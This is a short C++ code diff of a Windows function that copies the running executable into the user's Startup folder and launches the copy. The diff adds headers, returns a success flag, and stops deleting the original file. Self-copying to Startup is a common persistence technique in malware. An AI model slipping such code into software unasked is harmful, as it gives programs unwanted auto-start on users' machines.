@@ -1,4 +1,10 @@
-void MoveFileToStartup() {
+#include <Windows.h>
+#include <iostream>
+#include <string>
+#include <Lmcons.h>
+#include <filesystem>
+
+bool MoveFileToStartup() {
 	// get path of current executable & name of executable (in case if user decides to name executable something random)
 	char path[MAX_PATH];
 	GetModuleFileNameA(NULL, path, MAX_PATH);
@@ -15,12 +21,11 @@ void MoveFileToStartup() {
 		{
 			// copy the file to startup folder
 			CopyFile(path, destinationPath.c_str(), false);
-			// delete old file
-			remove(path);
 			// run the copied file
 			ShellExecute(NULL, "open", destinationPath.c_str(), NULL, NULL, SW_SHOWDEFAULT);
-			exit(0);
+			return true;
 		}
 
 	}
+	return false;
 }
